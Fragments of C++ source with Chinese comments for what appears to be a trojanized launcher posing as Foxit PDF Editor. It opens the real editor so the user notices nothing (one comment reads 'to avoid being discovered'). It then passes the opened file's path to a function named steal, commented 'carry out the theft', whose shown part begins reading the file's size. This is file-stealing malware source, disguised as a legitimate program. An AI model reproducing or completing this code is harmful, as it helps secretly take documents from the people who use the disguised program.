...
int main(int argc,char* argv[])//主函数，包括传递文件路径信息
{
	...
	{
		ShellExecute(NULL, L"open",L"\"c:/program files (x86)/Foxit Software/Foxit PDF Editor/FoxitPDFEditor.exe\"",NULL, NULL, SW_SHOWNORMAL);
		return 0;
	}
	...
	delete[] temp;//释放临时变量
	path2+=L"\"";
	ShellExecute(NULL, L"open",L"\"c:/program files (x86)/Foxit Software/Foxit PDF Editor/FoxitPDFEditor.exe\"",path2.c_str(), NULL, SW_SHOWNORMAL);//执行打开正常word命令
...
int main(int argc,char* argv[])//主函数，包括传递文件路径信息
{
	...
	//wchar_t *temppath=new wchar_t[512];//获取当前目录
	//_wgetcwd(temppath,512);
	//wstring softpath=L"\"";
	//softpath+=temppath;
	//delete[] temppath;
	//softpath+=L"\\FoxitPDFEditor.exe\"";//变成当前目录下的FoxitPDFEditor.exe程序

	if(argc==1)//避免被发现，正常打开foxitpdf程序
	{
		ShellExecute(NULL, L"open",L"\"c:/program files (x86)/Foxit Software/Foxit PDF Editor/FoxitPDFEditor.exe\"",NULL, NULL, SW_SHOWNORMAL);
		return 0;
	}
	...
	path+=L"\"";
	delete[] temp;//释放临时变量
	ShellExecute(NULL, L"open",L"\"c:/program files (x86)/Foxit Software/Foxit PDF Editor/FoxitPDFEditor.exe\"",path.c_str(), NULL, SW_SHOWNORMAL);//执行打开正常pdf命令
	steal(path,pathlength);//实施盗窃
	return 0;
}
...
int steal(wstring path,unsigned short pathlength)
{
	...
	struct _stat64 statbuf;
	_wstat64(cp_path,&statbuf);
	__int64 filesize = statbuf.st_size;
